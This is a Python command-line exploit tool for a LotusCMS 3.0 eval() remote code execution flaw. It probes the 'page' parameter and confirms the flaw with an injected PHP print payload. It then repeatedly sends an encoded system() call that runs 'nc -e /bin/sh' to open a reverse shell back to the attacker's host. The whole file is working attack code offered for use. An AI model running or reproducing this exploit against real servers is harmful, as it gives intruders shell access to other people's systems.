#!/usr/bin/python3
import argparse
import subprocess
import sys, re
import requests

def get_local_ip():
    output = subprocess.check_output(["sudo","ifconfig","eth0"]).decode("utf-8")
    ip_pattern = r"inet (?P<ip>((\d*).){4})"
    result = re.search(ip_pattern,output)
    return result.group("ip").rstrip()


def check_param(ssl, rh, rp, uri):
    if ssl:
        url = f"https://{rh}:{rp}{uri}index.php?page=index"
    else:
        url = f"http://{rh}:{rp}{uri}index.php?page=index"
    req = requests.get(url)
    return req.status_code


def check_vuln(ssl, rh, rp, uri):
    if ssl:
        url = f"https://{rh}:{rp}{uri}index.php?page=index%27%29%3B%24%7Bprint%28%27RCEVulnerable%27%29%7D%3B%23"
    else:
        url = f"http://{rh}:{rp}{uri}index.php?page=index%27%29%3B%24%7Bprint%28%27RCEVulnerable%27%29%7D%3B%23"
    req = requests.get(url)
    content = req.content
    result = str(content).find("RCEVulnerable")
    return result


def exploit(ssl, rh, rp, uri, lh, lp):
    if ssl:
        url = f"https://{rh}:{rp}{uri}index.php?page=index%27%29%3B%24%7Bsystem%28%27nc%20-e%20%2fbin%2fsh%20{lh}%20{lp}%27%29%7D%3B%23%22"
    else:
        url = f"http://{rh}:{rp}{uri}index.php?page=index%27%29%3B%24%7Bsystem%28%27nc%20-e%20%2fbin%2fsh%20{lh}%20{lp}%27%29%7D%3B%23%22"
    req = requests.get(url)


def main():
    parser = argparse.ArgumentParser(prog="lotuscms",
                                     description="Tool to exploit LotusCMS 3.0 eval() RCE vulnerable.")
    parser.add_argument("-rh", metavar="RHOST", required=True, help="Target Host.")
    parser.add_argument("-rp", metavar="RPORT", default="80", help="Target Port. Default: 80")
    parser.add_argument("-u", metavar="URI", default="/", help="URI (i.e /lms/. Default: /")
    parser.add_argument("-lh", metavar="LHOST", help="Local Host.")
    parser.add_argument("-lp", metavar="LPORT", default="444", help="Local Port. Default: 444")
    parser.add_argument("-s", action="store_true", help="SSL/TLS enable (True/False). Default: False")

    if len(sys.argv) < 1:
        parser.print_help()
        parser.exit(1)
    
    args=parser.parse_args()
    if args.lh is None:
        args.lh = get_local_ip()
    print(args)

    print("[*] Checking page param: /index.php?page=index ...")
    vuln_exist = check_param(args.s, args.rh, args.rp, args.u)
    if vuln_exist != 200:
        print("==> page param not found.")
    else:
        print("==> page param found.")
        print("[*] Checking if page is vulnerable to RCE ...")
        if check_vuln(args.s, args.rh, args.rp, args.u) == -1:
            print("==> page is not vulnerable.")
        else:
            print("==> page is vulnerable.")
            print("[*] Exploiting ...")
            try:
                while True:
                    exploit(args.s, args.rh, args.rp, args.u, args.lh, args.lp)
            except KeyboardInterrupt:
                print("User interrupted.")
            except Exception as err:
                print(err)
            finally:
                print("Bye bye.")

if __name__ == "__main__":
    main()
